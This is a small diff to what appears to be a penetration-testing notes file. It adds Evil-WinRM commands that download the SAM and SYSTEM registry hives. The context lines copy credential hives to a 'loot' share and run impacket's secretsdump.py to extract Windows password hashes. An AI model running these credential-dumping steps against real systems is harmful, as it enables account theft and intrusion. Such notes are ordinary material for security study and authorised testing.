@@ -3812,6 +3812,10 @@ copy c:\security z:\loot
 c:\system z:\loot
 ````
 ````
+*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
+*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
+````
+````
 /opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
 ````
 ````
